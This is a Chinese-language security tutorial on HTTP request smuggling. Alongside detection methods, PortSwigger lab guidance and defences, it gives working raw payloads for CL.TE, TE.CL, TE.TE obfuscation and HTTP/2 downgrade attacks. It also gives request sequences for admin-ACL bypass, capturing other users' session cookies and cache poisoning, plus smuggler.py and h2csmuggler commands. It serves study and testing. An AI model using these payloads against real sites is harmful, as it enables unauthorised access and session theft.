# HTTP 请求走私（HTTP Request Smuggling）

## 一句话理解
前端代理和后端服务器对"一个请求在哪里结束"理解不一致，攻击者把一个"暗藏前缀"的请求塞进 TCP 连接，让后端把残留部分拼到**下一个用户的请求**前面，从而越权、投毒、劫持他人会话。

## 核心原理
HTTP/1.1 有两种声明请求体长度的方式：
- `Content-Length`（CL）：字节数
- `Transfer-Encoding: chunked`（TE）：分块编码

链路上只要前端（CDN/反代）和后端对两者的优先级理解不同，边界就会错位：

| 类型 | 前端认 | 后端认 | 结果 |
| --- | --- | --- | --- |
| CL.TE | Content-Length | Transfer-Encoding | 后端把剩余字节当下一请求的开头 |
| TE.CL | Transfer-Encoding | Content-Length | 同上，方向相反 |
| TE.TE | 混淆后的 TE | 另一种 TE | 头混淆（大小写、空格、重复头）绕过一致性 |

与 [EXP-DNS-Rebinding](./EXP-DNS-Rebinding.md) 同属"不一致性"：都是两个组件对同一数据的解析出现分歧。

## 成立条件
- 存在"前置代理/CDN + 后端"的多层架构（单体直连无此问题）
- 前后端使用 HTTP/1.1 keep-alive 连接复用（请求会落在同一条连接上）
- 两端对 CL/TE 优先级处理不一致，或对歧义头未做规范化

## 检测思路
### 1. 时间差法（安全，优先用）
CL.TE 探测：发送后若后端按 chunked 等待下一个块（永远等不到），响应超时：

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### 2. 差异响应法
构造使后端把残留拼到下一个请求，观察后续请求是否收到异常响应（404 变 200、多了前缀）。

注意：差异法可能污染真实用户的请求，测试时尽量用时间差法先行确认。

## 经典探测与利用报文集

> 手工测试环境：Burp Repeater + HTTP/1.1，关闭 "Update Content-Length"（Repeater 左侧面板）。报文里的 `\r\n` 不可见，**Content-Length 与 chunk 大小必须按实际字节数手工计算**，差一个字节整条链路就断。

### 1. CL.TE：利用版（走私前缀"吞掉"下一个请求）

上文时间差探测确认 CL.TE 后，改用差异响应法验证利用。前端按 CL 切分、后端按 TE 解析——后端读到 `0\r\n\r\n` 认为请求结束，残留部分拼到**下一个用户请求**前面：

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 41
Transfer-Encoding: chunked

0

GET /404-probe HTTP/1.1
X-Ignore: X
```

长度计算：`0\r\n\r\n`（5 字节）+ `GET /404-probe HTTP/1.1\r\n`（25 字节）+ `X-Ignore: X`（11 字节，故意**不加**结尾换行）= 41。

发送后立刻**在同一连接**再发一个正常请求 `GET / HTTP/1.1`，后端实际解析到的是被拼接的畸形请求：

```http
# 受害者的 GET / 被走私前缀吞掉，成为 X-Ignore 头的值
GET /404-probe HTTP/1.1
X-Ignore: XGET / HTTP/1.1
Host: target.com
...（受害者请求的剩余部分）
```

前后对比：

```http
# 走私前：受害者请求 / 收到的响应
HTTP/1.1 200 OK
Content-Type: text/html
（首页内容）

# 走私后：后端响应的是被走私的 GET /404-probe
HTTP/1.1 404 Not Found
（受害者请求 / 却收到 404 —— 差异响应即证明走私成功）
```

### 2. TE.CL：探测报文（差异响应法）

前端按 TE 切分、后端按 CL 解析，方向相反。分两步操作——先发走私报文：

```http
POST / HTTP/1.1
Host: xxx
Transfer-Encoding: chunked
Content-Length: 4

5c
GPOST / HTTP/1.1
Content-Length: 6

0

```

- 前端按 chunked 解析：读到 `0\r\n\r\n` 认为请求完整，将整个报文转发给后端
- 后端按 `Content-Length: 4` 只消费 4 字节（`5c\r\n`），残留的 `GPOST / HTTP/1.1\r\nContent-Length: 6\r\n\r\n` 及之后内容全部成为"下一个请求"的开头
- `5c` 是十六进制（92 字节）块长，可比剩余实际字节数略大——前端会把后续到达的字节并入块数据继续读，不影响后端按 CL 切分

紧接着立刻发送正常请求 `GET / HTTP/1.1`，后端视角：

```http
GPOST / HTTP/1.1
Content-Length: 6

GET /   ← 受害者请求的前 6 字节成为 GPOST 的 body，其余部分作为再下一个请求
```

`GPOST` 方法不存在 → 受害者请求 `/` 却收到 404/400 异常响应，TE.CL 走私确认。

### 3. TE.TE：头混淆变体列表

前后端都认 TE，但对**畸形写法**的容错不同——用变体让一端识别出 chunked、另一端识别失败而退回按 CL 处理：

```http
Transfer-Encoding: xchunked              # 值前加干扰字符，宽松解析端仍按 chunked 处理
Transfer-Encoding : chunked              # 头名与冒号间加空格，一端当未知头直接丢弃
Transfer-Encoding: chunked               # 重复头"一真一假"（各端取首个/末个的规则不同）
Transfer-Encoding: x
Transfer-Encoding: chunked, identity     # 编码列表混入 identity
Transfer-Encoding:                       # 空值
Transfer-Encoding:	chunked               # 值前加 Tab（\x09）而非空格
 Transfer-Encoding: chunked              # 行首空格：RFC 头折行语法，被当作上一头的延续
X: x
Transfer-Encoding: chunked               # 借 X 头的值注入换行 + 完整 TE 头（头值内 CRLF 注入）
```

（`#` 后为中文注释，实际发送时去掉。）混淆成立后效果退化为 CL.TE 或 TE.CL，套用上面两种报文即可。

## 常见利用形式
### 1. 绕过前端访问控制
前端禁止访问 `/admin`，但走私的请求不经过前端规则匹配，直接在后端被解析执行。

### 2. 捕获他人请求（会话劫持）
把走私前缀构造成一个不完整的 POST（如评论提交），下一个用户的完整请求被拼进去当作该 POST 的 body——Cookie、Token 全落进攻击者可见的存储里。

### 3. Web 缓存投毒
走私触发异常响应被缓存，正常用户访问同一资源时拿到攻击者构造的内容（可挂 XSS）。

### 4. 绕过前端安全控制打内网
走私请求到达后端时可带上前端才会附加的内部头，或直接访问内部路由。

## 利用场景细化（含报文）

### 场景 A：绕过前端 ACL 访问 /admin

前端代理把 `/admin` 拉黑，但走私的请求**不经过前端路径规则匹配**，直接由后端解析执行：

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 76
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Authorization: Basic YWRtaW46YWRtaW4=
X-Ignore: X
```

- CL 计算：`0\r\n\r\n`（5）+ `GET /admin HTTP/1.1\r\n`（21）+ `Authorization: Basic YWRtaW46YWRtaW4=\r\n`（39）+ `X-Ignore: X`（11）= 76
- 前端全程只看到一个合法的 `POST /`，放行
- 后端先处理 `POST /`（chunked 空体），紧接着处理 `GET /admin` + 管理员凭据 → 越权成功
- 目标接口若要求特殊方法（如 `DELETE /users/carlos`），把走私首行改成对应方法即可——前端对此完全无感知

### 场景 B：捕获他人请求（会话劫持）

走私一个声明**超长 body** 的 POST，下一个用户的请求被整段吞进 body，落入攻击者可查看的存储（评论、搜索记录）：

```http
POST /post/comment HTTP/1.1
Host: target.com
Content-Length: <按实际计算>
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 800
Cookie: session=ATTACKER_SESSION

csrf=xxx&postId=1&comment=
```

- 走私请求的 `Content-Length: 800` 远大于实际内容，后端持续读取后续字节凑 body
- 下一个真实用户的请求（首行、`Cookie: session=VICTIM...`、Token 头）整段落入 `comment` 参数值
- 攻击者打开自己的评论页面，即可读到受害者完整请求头与会话凭据
- CL 取值技巧：先探测受害者请求的大致长度，走私 CL 设为略大于该值；设太大后端会继续等待下一个请求导致超时

### 场景 C：缓存投毒（响应错位污染缓存）

走私一个超长 CL 的静态资源请求，让后端返回的**本应属于别人的响应**被缓存服务器存到该静态资源的缓存 key 上（示意流程）：

```http
POST / HTTP/1.1
Host: target.com
Content-Length: <按实际计算>
Transfer-Encoding: chunked

0

GET /resources/js/tooltip.js HTTP/1.1
Host: target.com
Content-Length: 600

x=
```

- 走私的 `GET /resources/js/tooltip.js` 声明 body 600 字节，实际只有 `x=`，后端等待拼接
- 下一个受害者 `GET /` 的完整请求（连同请求头恰好约 600 字节）被吞为走私请求的 body，后端返回**首页 HTML** 作为对该走私请求的响应
- 前端缓存服务器对走私无感知，按它看到的请求 URL（tooltip.js）缓存了这个错位响应
- 结果：所有后续加载 tooltip.js 的用户拿到错位内容——内容可控时即全站投毒（可再配合 XSS payload 页面）
- 关键限制：走私请求的 CL 必须**精确等于**下一个请求从首行到结尾的总字节数（先探测长度再构造），且链路中必须存在缓存层

## HTTP/2 走私
- 前端 HTTP/2、后端 HTTP/1.1 的**降级链路**是现代走私主战场（H2.CL / H2.TE）
- HTTP/2 自身用帧定长，但降级时后端按 CL/TE 解析，差异重新出现
- 头部伪字段（`:method`、`:path`）与降级头的转换也可能引入注入点

## HTTP/2 降级走私具体手法（H2.CL / H2.TE）

### 1. H2.CL：content-length 伪头与 DATA 帧不符

HTTP/2 的消息边界由 DATA 帧决定，RFC 7540 要求 `content-length` 头（若有）必须与 DATA 帧总长一致，但**很多前端不校验**。前端把 H2 请求降级为 HTTP/1.1 时原样透传 `content-length` → 后端按这个"错误的 CL"切分边界。

攻击者在 Burp 的 HTTP/2 请求视图中构造的请求：

```http
:method: POST
:path: /
:authority: target.com
content-length: 5          ← 手动添加并篡改，与 DATA 帧真实长度不符
```

DATA 帧实际承载的 body（远超 5 字节）：

```http
GET /admin HTTP/1.1
X: 
```

后端降级后收到的 HTTP/1.1 流（示意）：

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 5

GET /     ← 后端只认前 5 字节为本请求的 body
/admin HTTP/1.1
X: GET / HTTP/1.1          ← 残留字节拼到下一个请求开头，形成走私
```

### 2. H2.TE：注入 transfer-encoding 头

HTTP/2 明确禁止连接管理类头（`Transfer-Encoding`、`Connection`），但前端降级时若把普通头原样透传，后端就会按 chunked 解析 body，效果与 CL.TE 同构：

```http
:method: POST
:path: /
:authority: target.com
transfer-encoding: chunked    ← 作为普通头注入（小写）
```

DATA 帧实际 body：

```http
0

GET /admin HTTP/1.1
X: 
```

后端按 chunked 读到 `0\r\n\r\n` 结束本请求，`GET /admin ...` 拼到下一个请求开头。

### 3. 伪字段与 CRLF 注入

- **`:path` 注入**：H2 的 `:path` 经 HPACK 解码后可承载任意字节。若前端做 H2→H1 转换时把它直接拼进请求行而不校验转义，URL 编码的 `%0d%0a`（部分前端会在降级时解码）或原始 CRLF 即可截断请求行、注入第二个请求。多数前端会拒绝含 CR/LF 的 `:path`，但"接受 URL 编码形式且降级时解码"的实现真实存在（PortSwigger 称为 request splitting）
- **`:path` 整体走私**：`:path: / HTTP/1.1\r\n\r\nGET /admin HTTP/1.1\r\nHost: x\r\n\r\n`——让降级后的请求行连同注入内容整体错位，可绕过需要客户端证书 / TLS 指纹校验的前端
- **`content-length` 伪头**：即 H2.CL，本质是"头声明长度"与"帧真实长度"两个信任源不一致
- **头值内 CRLF**：H2 头值允许的字节比 H1 宽松，注入 `\r\n` 可在降级后的 H1 报文中拆出新头

### 4. Burp Repeater 实操要点（以 H2.CL 为例）

1. 确认目标支持 HTTP/2：Proxy 的 HTTP history 里查看 "HTTP/2" 列
2. Repeater 中 Inspector → Request attributes → 把协议切换为 HTTP/2
3. 直接在请求中添加 `content-length` 头并赋一个**小于 body 实际长度**的值（Burp 会把它作为普通头发送给前端）
4. body 中放置完整走私内容，如 `GET /404 HTTP/1.1\r\nX: `
5. 发送后立刻再发一个正常请求，观察是否出现错位响应（404 / 异常）
6. 新版 Burp 内置 H2 desync 检测；老版本用 HTTP Request Smuggler 插件右键 "H2.CL desync" 一键探测

## 工具

### 1. Burp 插件 HTTP Request Smuggler
- 安装：BApp Store 搜索 "HTTP Request Smuggler"
- 自动探测：目标请求右键 → Extensions → HTTP Request Smuggler → **Launch single request attack**，自动构造 CL.TE / TE.CL / TE.TE（含混淆变体）逐一发送，用超时与差异响应判定，疑似 desync 会标红提示
- HTTP/2 目标：右键还有 "H2.CL desync" / "H2.TE desync" 等专项探测入口
- 整站探测：Site map 中右键域名批量跑（生产环境慎用，注意并发与业务影响）
- 插件报 "potential desync" 后务必回 Repeater 手工验证，排除误报

### 2. smuggler.py（defparam/smuggler，命令行探测）

```bash
# 基础用法：自动跑全部 CL/TE 组合与混淆变体
python smuggler.py -u https://target.com

# 指定方法与路径（POST + 敏感路径效果更好）
python smuggler.py -u https://target.com -m POST -l /admin

# 查看全部参数
python smuggler.py -h
```

### 3. h2csmuggler（BishopFox/h2csmuggler，h2c 升级绕过）

思路：代理拒绝 CONNECT / HTTPS 隧道，但接受 `Upgrade: h2c` 明文升级——升级成功后隧道内的请求不再经过代理的访问控制：

```bash
# 探测目标代理是否允许 h2c upgrade
python3 h2csmuggler.py -x http://target.com -t

# 通过 h2c 隧道访问代理"身后"的内网资源
python3 h2csmuggler.py -x http://target.com http://internal-host:8080/
```

### 4. Burp Repeater 手工（最可靠）
- HTTP/1.1 走私：关闭 "Update Content-Length"，手工计算 CL / chunk 大小
- HTTP/2 走私：Inspector 切换协议后注入 `content-length` / `transfer-encoding` 普通头

## 快速判断流程
1. 确认架构存在代理层（CDN、Nginx、云 WAF）
2. 时间差法分别探测 CL.TE 与 TE.CL
3. 确认后换差异响应法验证可利用性
4. 评估能映射到哪类利用：绕 ACL / 缓存投毒 / 会话捕获

## 案例：PortSwigger Web Security Academy 实验列表指引

官方成体系的靶场（[Request smuggling 全目录](https://portswigger.net/web-security/request-smuggling)），每个 lab 聚焦一个考点，按顺序刷完即覆盖全部主流手法：

| Lab | 考点一句话 |
| --- | --- |
| Basic CL.TE vulnerability | 用差异响应（走私 404 探测请求）确认前端认 CL、后端认 TE |
| Basic TE.CL vulnerability | 反向版本，重点练 chunk 大小的手工计算 |
| TE.TE obfuscation vulnerability | 用头混淆变体让其中一端的 TE 解析失效 |
| Bypass front-end security controls (CL.TE) | 走私 `GET /admin` 拿管理员接口，再走私 `DELETE` 删用户 |
| Bypass front-end security controls (TE.CL) | 同上但走 TE.CL，走私请求需自带正确的 CL |
| Reveal front-end request rewriting | 走私超长 CL 的搜索请求，捕获前端附加的内部头（X-User 等）进搜索结果 |
| Capture other users' requests | 走私带超长 CL 的评论 POST，吞掉下一用户的请求读其 Cookie |
| Deliver reflected XSS | 走私访问带 XSS payload 的参数页面，让后续用户命中已投毒内容 |
| Web cache poisoning via smuggling | 走私造成响应错位，污染缓存 key |
| Response queue poisoning (H2) | H2 降级走私不完整请求，让响应队列整体错位、劫持任意用户响应 |
| H2.CL request smuggling | `content-length` 头与 DATA 帧长度不符 |
| H2.TE request smuggling | 注入 `transfer-encoding` 普通头并透传 |
| CRLF / request splitting via `:path` (H2) | `:path` 注入 CRLF 拆出第二个请求，绕过前端认证 / WAF |

（lab 清单随官网更新略有调整，以目录页为准。）

## 防御要点
- 前后端统一使用 HTTP/2 端到端，避免降级
- 前置代理规范化歧义请求：拒绝同时含 CL 和 TE 的请求
- 后端禁用连接复用（或对复用连接做严格边界校验）可根治但影响性能
- 保持组件更新（历次 CVE 修复了大量解析差异）

## 参考
- [PortSwigger - HTTP Request Smuggling（系列主页 + 全部 lab）](https://portswigger.net/web-security/request-smuggling)
- [James Kettle - HTTP Desync Attacks: Request Smuggling Reborn（Black Hat US 2019，经典必读）](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [James Kettle - HTTP/2 Request Smuggling（2021）](https://portswigger.net/research/http2-request-smuggling)
- [James Kettle - Browser-Powered Desync Attacks（2022，客户端视角走私）](https://portswigger.net/research/browser-powered-desync-attacks)
- [请求走私总结@chenjj](https://github.com/chenjj/Awesome-HTTPRequestSmuggling)
